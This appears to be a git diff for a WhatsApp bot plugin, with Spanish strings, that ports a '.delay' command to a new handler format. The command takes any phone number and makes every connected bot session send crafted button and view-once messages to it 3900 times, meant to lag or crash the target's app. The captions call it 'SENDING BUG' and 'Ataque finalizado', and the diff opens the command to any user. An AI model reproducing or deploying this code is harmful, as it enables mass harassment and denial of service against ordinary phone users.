@@ -1,6 +1,5 @@
 const chalk = require("chalk");
 
-// ==== Utilidades ====
 const delay = (ms) => new Promise((res) => setTimeout(res, ms));
 const cooldowns = global.delayCooldowns || new Map();
 
@@ -17,7 +16,6 @@ async function safeExec(label, fn) {
   }
 }
 
-// ==== Función 1: InVisibleX ====
 async function InVisibleX(sock, jid, mention) {
   let msg = await generateWAMessageFromContent(jid, {
     buttonsMessage: {
@@ -89,7 +87,6 @@ async function InVisibleX(sock, jid, mention) {
   }
 }
 
-// ==== Función 2: xatanicaldelayv2 ====
 async function xatanicaldelayv2(sock, jid, mention) {
   let message = {
     viewOnceMessage: {
@@ -153,17 +150,11 @@ async function xatanicaldelayv2(sock, jid, mention) {
   });
 }
 
-// ==== Función 3: sickdelay ====
 async function sickdelay(sock, jid) {
-  if (!sock.user) throw new Error("Bot no está activo.");
+  if (!sock.user) throw new Error("Bot no activo");
 
-  console.log(chalk.green(`STARTING DELAY ${jid}`));
-
-  for (let i = 1; i <= 3900; i++) {
+  for (let i = 0; i < 3900; i++) {
     if (!sock.user) break;
-
-    console.log(chalk.red.bold(`DELAY SEND TO ${jid}`));
-
     await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
     await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
     await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
@@ -173,69 +164,60 @@ async function sickdelay(sock, jid) {
     await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
     await delay(2000);
   }
-
-  console.log(`✅ Finalizado delay para ${jid} por ${sock.user.id}`);
 }
 
-// ==== Comando .delay CrowBot ====
-module.exports = {
-  name: "delay",
-  commands: ["delay"],
-  handle: async ({ sock, args, remoteJid }) => {
-    const cooldownTime = 60 * 1000;
-    const now = Date.now();
-    const userNumber = remoteJid;
+let handler = async (m, { conn, args }) => {
+  const user = m.sender;
+  const cooldownTime = 60 * 1000;
+  const now = Date.now();
+  const lastUse = cooldowns.get(user);
 
-    const input = args[0];
-    if (!input) {
-      return sock.sendMessage(remoteJid, {
-        text: "❗️Ejemplo: *.delay 52xxxxxxxxxx*",
-      });
-    }
+  if (!args[0]) {
+    return conn.sendMessage(m.chat, { text: '❗️Ejemplo: .delay 52xxxxxxxxxx' }, { quoted: m });
+  }
 
-    const formattedNumber = input.replace(/[^0-9]/g, "");
-    const jid = `${formattedNumber}@s.whatsapp.net`;
+  if (lastUse && now - lastUse < cooldownTime) {
+    const remaining = Math.ceil((cooldownTime - (now - lastUse)) / 1000);
+    return conn.sendMessage(m.chat, { text: `⏱️ Espera ${remaining} segundos antes de volver a usarlo.` }, { quoted: m });
+  }
 
-    const lastUse = cooldowns.get(userNumber);
-    if (lastUse && now - lastUse < cooldownTime) {
-      const remaining = Math.ceil((cooldownTime - (now - lastUse)) / 1000);
-      return sock.sendMessage(remoteJid, {
-        text: `⏱️ Espera ${remaining} segundos antes de usarlo de nuevo.`,
-      });
-    }
+  cooldowns.set(user, now);
+  global.delayCooldowns = cooldowns;
 
-    cooldowns.set(userNumber, now);
-    global.delayCooldowns = cooldowns;
+  const number = args[0].replace(/[^0-9]/g, "");
+  const jid = `${number}@s.whatsapp.net`;
 
-    await sock.sendMessage(remoteJid, {
-      image: { url: "https://files.catbox.moe/bbnxok.jpg" },
-      caption: `
+  await conn.sendMessage(m.chat, {
+    image: { url: "https://files.catbox.moe/bbnxok.jpg" },
+    caption: `
 ╭━━━⭓「 SENDING BUG 」
 ┃ ◇ FECHA : ${dateTime()}
-┃ ◇ USUARIO : ${userNumber.split("@")[0]}
+┃ ◇ USUARIO : ${user.split("@")[0]}
 ┃ ◇ MÉTODO : DELAY
-┃ ◇ TARGET : ${formattedNumber}
+┃ ◇ TARGET : ${number}
 ╰━━━━━━━━━━━━━━━━━━⭓
 
-🔗 https://wa.me/${formattedNumber}
-      `.trim(),
-    });
+🔗 https://wa.me/${number}
+    `.trim(),
+  }, { quoted: m });
 
-    let success = 0;
-    let fail = 0;
+  let success = 0;
+  let fail = 0;
 
-    for (const [botNum, conn] of sessions.entries()) {
-      try {
-        await sickdelay(conn, jid);
-        success++;
-      } catch (err) {
-        console.log(`❌ Error con ${botNum}: ${err.message}`);
-        fail++;
-      }
+  for (const [id, sock] of sessions.entries()) {
+    try {
+      await sickdelay(sock, jid);
+      success++;
+    } catch (e) {
+      fail++;
     }
+  }
 
-    await sock.sendMessage(remoteJid, {
-      text: `✅ Ataque finalizado\n✔️ Bots enviados: ${success}\n❌ Bots fallidos: ${fail}`,
-    });
-  },
+  await conn.sendMessage(m.chat, {
+    text: `✅ Ataque finalizado\n✔️ Enviados: ${success}\n❌ Fallidos: ${fail}`,
+  }, { quoted: m });
 };
+
+handler.command = ["delay"];
+handler.owner = false; // ✅ Cualquiera puede usarlo
+export default handler;
